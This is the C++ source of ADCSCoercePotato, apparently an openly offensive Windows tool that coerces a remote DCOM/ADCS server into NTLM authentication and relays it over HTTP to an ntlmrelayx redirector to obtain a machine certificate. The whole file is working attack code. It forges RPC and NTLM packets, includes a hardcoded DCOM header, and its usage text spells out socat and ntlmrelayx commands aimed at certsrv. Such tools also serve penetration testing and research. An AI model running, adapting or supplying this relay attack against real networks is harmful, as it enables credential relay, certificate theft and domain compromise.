#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <UserEnv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <WinSafer.h>

#include "HTTPCrossProtocolRelay.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
wchar_t* wdcom_ip=NULL;
wchar_t* wredir_ip=NULL;
wchar_t* wredir_port=NULL;
char dcom_port[12];
char dcom_ip[17];
wchar_t* username=NULL;
wchar_t* password=NULL;
wchar_t* domain=NULL;
static const char VERSION[] = "0.1";
int g_sessionID = 4;
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;
extern int findNTLMBytes(char* bytes, int len);
extern void DumpHex(const void* data, size_t size);
int  ForgeAndAlterType2Rpc(char* rpcType2Packet, int rpcType2PacketLen, int authIndexStart, char* ntlmType2, int ntlmType2Len, char* newRpcType2Packet) {
	short* fragLen = (short*)rpcType2Packet + 4;
	short* authLen = (short*)rpcType2Packet + 5;
	int ntlmPacketLen = rpcType2PacketLen - authIndexStart;
	*fragLen = *fragLen - ntlmPacketLen + ntlmType2Len;
	*authLen = ntlmType2Len;
	memcpy(newRpcType2Packet, rpcType2Packet, authIndexStart);
	memcpy(newRpcType2Packet + authIndexStart, ntlmType2, ntlmType2Len);
	return (authIndexStart + ntlmType2Len);
}

DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam);
struct THREAD_PARAMETERS
{
	wchar_t* remoteHTTPRelayServerIp;
	wchar_t* remoteHTTPRelayServerPort;
	
};
int PotatoAPI::findNTLMBytes(char* bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}
void usage()
{
	printf("ADCSCoercePotato\n- @decoder_it 2024\n\n", VERSION);

	printf("Mandatory args: \n"
		"-u Domain Username\n"
		"-p password\n"
		"-d Domain Name\n"
		"-m <host or IP> remote DCOM (ADCS) server address\n"
		"-k <IP> redirector where socat and ntlmrelayx is running\n"
		
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-n <port> HTTP port where redirector (ntlmrelayx) is listening, default:80\n"
		"-l <port> local socket server port, default:9999\n"
		"-c <clsid> default:{D99E6E74-FC88-11D0-B498-00A0C90312F3}"
		
		
	);
	printf("\n\n");
	printf("Example: ADCSCoercePotato.exe -m 192.168.212.22 -k 192.168.1.88 -u myuser -p mypass -d mydomain.domain\n");
	printf("         On the Linux box (assuming it has IP:192.168.1.88 and the Windows attacker machine is:192.168.1.89)\n");
	printf("         and ADCS web enrollment service is also running on:192.168.212.41\n");
	printf("         -> socat tcp -listen:135, reuseaddr, fork tcp:192.168.1.89:9999 &\n");
	printf("         -> ntlmrelayx.py -t http://192.168.212.41/certsrv/certrqus.asp --adcs --template Machine -smb2support\n\n");

}
void ParseUsernameFromType3(char* ntlmType3, int ntlmType3Len) {
	short* domainLen, * userLen, * hostnameLen;
	__int32* domainOffset, * userOffset, * hostnameOffset;
	wchar_t domain[32], user[32], hostname[32];
	domainLen = (short*)(ntlmType3 + 28);
	userLen = (short*)(ntlmType3 + 36);
	hostnameLen = (short*)(ntlmType3 + 44);
	domainOffset = (__int32*)(ntlmType3 + 32);
	userOffset = (__int32*)(ntlmType3 + 40);
	hostnameOffset = (__int32*)(ntlmType3 + 48);
	memset(domain, 0, 32);
	memcpy(domain, ntlmType3 + (*domainOffset), *domainLen);
	memset(user, 0, 32);
	memcpy(user, ntlmType3 + (*userOffset), *userLen);
	memset(hostname, 0, 32);
	memcpy(hostname, ntlmType3 + (*hostnameOffset), *hostnameLen);
	printf("[+] Got NTLM type 3 AUTH message from %S\\%S with hostname %S \n", domain, user, hostname);

}


PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
	
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}



int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSID CLSID_ComActivator;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	//ComActivator CLSID
	CLSIDFromString(OLESTR("{0000033C-0000-0000-c000-000000000046}"), &CLSID_ComActivator);

	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;
	//Call CoGetInstanceFromIStorage
	COAUTHINFO ca = { 0 };
	ca.dwAuthnSvc = RPC_C_AUTHN_WINNT;
	ca.dwAuthzSvc = RPC_C_AUTHZ_NONE;
	ca.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
	ca.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
	COAUTHIDENTITY id = { 0 };
	ca.pAuthIdentityData = &id;
	id.User = (USHORT*)username;
	id.UserLength = wcslen(username);
	id.Password = (USHORT*)password;
	id.PasswordLength = wcslen(password);;
	id.Domain = (USHORT*)domain;
	id.DomainLength = wcslen(domain);
	id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

	COSERVERINFO c = { 0 };
	c.pwszName = wdcom_ip;
	c.pAuthInfo = &ca;

	CoInitialize(0);
	CoInitializeEx(0, COINIT_APARTMENTTHREADED);
	CoInitializeSecurity(0, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
	HRESULT status=0;
	std::string message = std::system_category().message(status);

	
	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S on remote endpoint:%S\n", olestr, wdcom_ip);

	status = CoGetInstanceFromIStorage(&c, &clsid, NULL, CLSCTX_REMOTE_SERVER, t, 1, qis);
	
	
	if (status == CO_E_BAD_PATH)
		printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid);
	else
		printf("[*] Trigger DCOM status: 0x%x - %s\n", status, message.c_str());
	
	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, "127.0.0.1");
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf("RPC -> send failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf("RPC-> Connection closed\n");
		}
		else {
			printf("RPC -> recv failed with error: %d\n", WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}
DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
	//DoHTTPCrossProtocolRelay(thread_params->remoteHTTPRelayServerIp, thread_params->remoteHTTPRelayServerPort);
	return 0;
}

void ExtractType3FromRpc(char* rpcPacket, int rpcPacketLen, char* ntlmType3, int* ntlmType3Len) {
	int ntlmIndex = findNTLMBytes(rpcPacket, rpcPacketLen);
	short* authLen = (short*)rpcPacket + 5;
	memcpy(ntlmType3, rpcPacket + ntlmIndex, *authLen);
	*ntlmType3Len = (int)*authLen;
	ParseUsernameFromType3(ntlmType3, *ntlmType3Len);


}

int PotatoAPI::startCOMListener(void) {
	
	WSADATA wsaData;
	int iResult;
	struct addrinfo* result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char* sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);

	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf("accept failed with error: %d\n", WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}
	char* dcomheader = \
		"\x05\x00\x0C\x07\x10\x00\x00\x00\x1C\x01\xD8\x00\x03\x00\x00\x00\xD0\x16\xD0\x16\x5E\x0E\x00\x00\x04\x00\x31\x33\x35\x00\x4C\x4D\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00\x0A\x05\x00\x00\x00\x00\x00\x00\x4E\x54\x4C\x4D\x53\x53\x50\x00\x02\x00\x00\x00\x0A\x00\x0A\x00\x38\x00\x00\x00\x15\x82\x89\xE2\xB7\xA3\x0E\xD9\x91\x66\x38\x78\x00\x00\x00\x00\x00\x00\x00\x00\x96\x00\x96\x00\x42\x00\x00\x00\x0A\x00\x7C\x4F\x00\x00\x00\x0F\x4D\x00\x59\x00\x4C\x00\x41\x00\x42\x00\x02\x00\x0A\x00\x4D\x00\x59\x00\x4C\x00\x41\x00\x42\x00\x01\x00\x12\x00\x57\x00\x45\x00\x42\x00\x2D\x00\x4D\x00\x59\x00\x4C\x00\x41\x00\x42\x00\x04\x00\x16\x00\x6D\x00\x79\x00\x6C\x00\x61\x00\x62\x00\x2E\x00\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x03\x00\x2A\x00\x77\x00\x65\x00\x62\x00\x2D\x00\x6D\x00\x79\x00\x6C\x00\x61\x00\x62\x00\x2E\x00\x6D\x00\x79\x00\x6C\x00\x61\x00\x62\x00\x2E\x00\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x05\x00\x16\x00\x6D\x00\x79\x00\x6C\x00\x61\x00\x62\x00\x2E\x00\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x07\x00\x08\x00\xA0\xE9\xD6\x4C\x2D\x66\xDA\x01\x00\x00\x00\x00\x05\x00\x0C\x07\x10\x00\x00\x00\x1C\x01\xD8\x00\x03\x00\x00\x00";

		
	
	int ntlmLoc, ntlmIndex;
	char ntlmType1[DEFAULT_BUFLEN];
	char ntlmType2[DEFAULT_BUFLEN];
	char ntlmType3[DEFAULT_BUFLEN];
	char recvbuf2[DEFAULT_BUFLEN]; 
	char type1BakBuffer[DEFAULT_BUFLEN];
	char tmprec[DEFAULT_BUFLEN];
	int recvbuflen2 = DEFAULT_BUFLEN;
	char* httpPacketType1;
	char *httpPacketType3;
	int type1BakLen;
	int httpPacketType1Len, httpPacketType3Len;
	int iResult2, ntlmType2Len=0, ntlmType3Len = 0;
	
	
	SOCKET HTTPSocket = CreateHTTPSocket(wredir_ip, wredir_port);
	SOCKET RPCSocket = CreateHTTPSocket(L"127.0.0.1",L"135");
	
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {

			
			ntlmIndex = findNTLMBytes(recvbuf, iResult);
			if (ntlmIndex != -1 && (recvbuf[ntlmIndex + 8] == 1))
			{
				memcpy(type1BakBuffer, recvbuf, iResult);
				type1BakLen = iResult;
				memcpy(ntlmType1, recvbuf + ntlmIndex, iResult - ntlmIndex);
				printf("[*] NTLM Type  1\n");
				DumpHex(recvbuf, iResult);			//send the new packet sendbuf

				httpPacketType1 = ForgeHTTPRequestType1(ntlmType1, iResult - ntlmIndex, &httpPacketType1Len, wredir_ip);
				iSendResult = send(HTTPSocket, httpPacketType1, httpPacketType1Len, 0);
				

				iResult2 = recv(HTTPSocket, recvbuf2, recvbuflen2, 0);
				
				ExtractType2FromHttp(recvbuf2, iResult2, ntlmType2, &ntlmType2Len);
				//printf("sent to relay...");
				memcpy(type1BakBuffer, recvbuf, iResult);
				type1BakLen = iResult;
			}
			if (ntlmIndex != -1 && (recvbuf[ntlmIndex + 8] == 3))
			{
				printf("[*] NTLM Type  3\n");
				DumpHex(recvbuf, iResult);			//send the new packet sendbuf

				ExtractType3FromRpc(recvbuf, iResult, ntlmType3, &ntlmType3Len);
				httpPacketType3 = ForgeHTTPRequestType3(ntlmType3, ntlmType3Len, &httpPacketType3Len, wredir_ip);
				// send the type3 AUTH to the http server, cross the finger :D
				iSendResult = send(HTTPSocket, httpPacketType3, httpPacketType3Len, 0);
				
				 

			}
			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			ntlmIndex = findNTLMBytes(sendbuf, iResult);
			if (ntlmIndex != -1 && (sendbuf[ntlmIndex + 8] == 2))
			{
				printf("[*] NTLM Type 2\n");
				DumpHex(sendbuf, *len);			//send the new packet sendbuf
				//ForgeAndAlterType2Rpc(, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
				if (send(RPCSocket, type1BakBuffer, type1BakLen, 0) == SOCKET_ERROR) {
					printf("[!] Couldn't communicate with the fake RPC Server\n");
					break;
				}
				// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
				iResult = recv(RPCSocket, recvbuf, recvbuflen, 0);
				if (iResult == SOCKET_ERROR) {
					printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
					break;
				}
				ntlmIndex = findNTLMBytes(recvbuf, iResult);
				*len = ForgeAndAlterType2Rpc(recvbuf, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
				//ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
				// 
				//*len = ForgeAndAlterType2Rpc(dcomheader, iResult, ntlmIndex, ntlmType2, ntlmType2Len, sendbuf);
				
			
			}

			iSendResult = send(ClientSocket, sendbuf, *len, 0);
			
			if (iSendResult == SOCKET_ERROR) {
				printf("COM -> send failed with error: %d\n", WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf("COM -> recv failed with error: %d\n", WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}




int wmain(int argc, wchar_t** argv)
{
	BOOL brute = FALSE;

	
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			
			case 'p':
				++argv;
				--argc;
				//processname = argv[1];
				password = argv[1];
				break;
			case 'u':
				++argv;
				--argc;
				//processname = argv[1];
				username = argv[1];
				break;
			case 'd':
				++argv;
				--argc;
				//processname = argv[1];
				domain = argv[1];
				break;
			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			
			case 'm':
				++argv;
				--argc;
				
				wdcom_ip = argv[1];
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				wredir_ip = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				wredir_port = argv[1];
				break;

			default:
				printf("Wrong Argument: %s\n", argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		g_port = L"9999";
	}
	if (wredir_port == NULL)
	{
		wredir_port = L"80";
	}
	if(wdcom_ip == NULL || wredir_ip==NULL ||domain==NULL || username==NULL || password==NULL)

	
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{D99E6E74-FC88-11D0-B498-00A0C90312F3}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	//if (!TEST_mode)
		//printf("Testing %S %S\n", olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	
	return 1;
	
}
